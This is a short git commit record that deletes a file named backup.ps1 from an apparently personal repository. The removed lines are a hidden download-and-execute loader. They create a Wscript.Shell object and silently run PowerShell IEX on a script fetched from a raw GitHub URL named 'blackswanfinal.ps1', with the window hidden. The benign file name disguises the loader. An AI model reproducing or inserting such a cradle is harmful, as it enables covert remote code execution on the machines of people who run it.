0d0c7b920e8a7e1631333f362d708d583cf7d87f
section10housing <68567390+section10housing@users.noreply.github.com>
2020-09-26 07:16:29 +0000

    Delete backup.ps1

--- backup.ps1
+++
@@ -1,2 +0,0 @@
-Set a1 = CreateObject("Wscript.Shell")
-a1.Run ("powershell IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/section10housing/b1/master/blackswanfinal.ps1')"), 0, False
